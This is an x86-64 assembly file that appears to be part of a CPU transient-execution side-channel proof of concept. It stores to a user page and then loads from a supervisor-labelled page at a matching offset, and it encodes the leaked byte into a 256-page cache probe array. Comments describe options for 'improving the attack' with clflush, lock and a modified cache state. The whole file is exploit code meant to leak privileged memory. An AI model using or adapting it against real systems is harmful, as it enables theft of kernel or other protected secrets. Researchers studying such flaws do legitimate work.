#define IMPROVE_CLFLUSH    0
#define IMPROVE_LOCK       0
#define IMPROVE_MODIFY     1

    .data    
    .global oracles
.align 0x1000
oracles:
    .space 4096*256, 0

    .global address_supervisor
address_supervisor:
    .space 4096, 0x55

    .global address_normal
address_normal:
    .space 4096*32, 0


i_encode_secret_1byte:
    lea oracles, %r13
    and $0xff, %rax
    shlq $12, %rax
    movb (%r13,%rax,1), %al
    ret

.macro prologue_1byte
    push %r14
    push %r15
.endm

.macro epilogue_1byte    
    call i_encode_secret_1byte
    pop %r15
    pop %r14
    ret
.endm


    .global s_faulty_load
s_faulty_load:
    prologue_1byte

    // Load address
    lea address_supervisor, %r15
    add $0x822, %r15

    // Store address
    lea address_normal, %r14
    add $0x4822, %r14

    // Improve the AttacK by putting the store to a modified state

#if IMPROVE_CLFLUSH
    clflush (%r14)  
#endif

#if IMPROVE_LOCK
    lock
#endif
#if IMPROVE_MODIFY
    incl (%r14)
#endif


    // Store
    movb $0x41, (%r14)

    // Load
    movb (%r15), %al

    epilogue_1byte
